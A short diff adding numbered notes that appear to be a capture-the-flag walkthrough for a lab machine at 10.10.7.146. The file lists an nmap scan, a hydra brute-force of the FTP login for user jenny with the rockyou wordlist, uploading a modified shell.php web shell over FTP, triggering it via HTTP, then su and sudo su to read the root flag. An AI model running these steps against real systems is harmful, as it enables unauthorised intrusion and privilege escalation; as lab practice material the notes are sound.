@@ -1,0 +1,9 @@
+1 - nmap -A 10.10.7.146
+2 - hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.7.146
+3 - ftp 10.10.7.146
+4 - get shell.php -> change -> put shell.php
+5 - http://10.10.7.146/shell.php
+6 - su jenny
+7 - sudo -l
+8 - sudo su
+9 - cat /root/Reptile/flag.txt
